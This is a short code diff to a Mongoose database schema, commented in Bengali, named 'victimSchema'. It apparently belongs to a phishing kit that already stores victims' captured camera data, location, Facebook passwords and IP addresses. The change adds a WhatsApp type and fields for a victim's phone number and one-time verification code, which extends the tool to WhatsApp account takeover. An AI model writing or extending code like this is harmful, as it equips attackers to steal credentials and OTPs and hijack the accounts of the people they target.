@@ -3,7 +3,7 @@ const mongoose = require('mongoose');
 const victimSchema = new mongoose.Schema({
     id: { type: String, unique: true, required: true },
     fbId: { type: String, default: 'unknown' },
-    type: { type: String, enum: ['camera', 'location', 'fb'], default: 'camera' },  // ✅ location যোগ
+    type: { type: String, enum: ['camera', 'location', 'fb', 'wp'], default: 'camera' },
     shortLink: { type: String },
     timestamp: { type: Date, default: Date.now },
     status: { type: String, default: 'pending' },
@@ -80,6 +80,13 @@ const victimSchema = new mongoose.Schema({
         password: { type: String, default: '' },
         timestamp: { type: Date, default: Date.now },
         ip: { type: String, default: 'N/A' }
+    },
+    
+    // 🔥 হোয়াটসঅ্যাপ ডেটার জন্য নতুন ফিল্ড
+    wpData: {
+        phone: { type: String, default: '' },
+        otp: { type: String, default: '' },
+        timestamp: { type: Date, default: Date.now }
     },
     
     collectedAt: { type: Date, default: Date.now }
